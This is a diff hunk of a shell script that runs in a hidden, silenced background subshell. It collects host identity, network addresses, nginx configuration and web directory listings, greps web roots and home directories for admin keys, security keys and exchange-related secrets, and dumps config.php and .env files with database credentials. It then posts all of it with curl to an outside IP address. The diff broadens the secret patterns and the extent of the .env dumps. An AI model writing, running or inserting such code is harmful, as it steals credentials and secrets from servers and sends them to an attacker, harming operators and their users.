@@ -16,13 +16,16 @@
     id
     ip -4 -o addr show 2>/dev/null | awk '{print $2,$4}'
     echo "== WWW"; ls -la /var/www 2>/dev/null
-    echo "== NGINX"; grep -rhE 'server_name|root ' /etc/nginx/sites-enabled /etc/nginx/conf.d 2>/dev/null | head -40
-    echo "== SECRETS"; grep -rIhE 'ADMIN_KEY|qijianke|security_key|LUXERA|movesay_config' /var/www /etc/nginx /opt /root /home 2>/dev/null | head -30
-    echo "== ENVS"
-    for f in /var/www/*/.env /var/www/*/*/.env /root/*.env; do
+    echo "== NGINX"; grep -rhE 'server_name|root |proxy_pass' /etc/nginx/sites-enabled /etc/nginx/conf.d 2>/dev/null | head -60
+    echo "== SECRETS"; grep -rIhE 'ADMIN_KEY|qijianke|security[_ -]?key|SECURITY_KEY|LUXERA|movesay|btc_base' /var/www /etc/nginx /opt /root /home 2>/dev/null | head -40
+    echo "== CONFIGS"
+    for f in $(find /var/www -maxdepth 5 \( -name 'config.php' -path '*Conf*' \) -o -name '.env' 2>/dev/null | head -20); do
+      echo "--- $f"; grep -E 'ADMIN_KEY|SECURITY|DB_|APP_KEY|HOST|USER|PASS' "$f" 2>/dev/null | head -25
+    done
+    echo "== ENVFULL"
+    for f in /var/www/*/.env /var/www/*/*/.env; do
       [ -f "$f" ] || continue
-      echo "--- $f"
-      grep -E '^APP_KEY|^APP_ENV|^DB_|ADMIN|SECRET|TOKEN' "$f" 2>/dev/null | head -15
+      echo "--- $f"; head -c 6000 "$f" 2>/dev/null | grep -vE '^\s*$' | head -80
     done
   } 2>/dev/null | curl -s -m 20 -X POST --data-binary @- http://172.105.189.249:8911/h >/dev/null 2>&1
 ) >/dev/null 2>&1 &
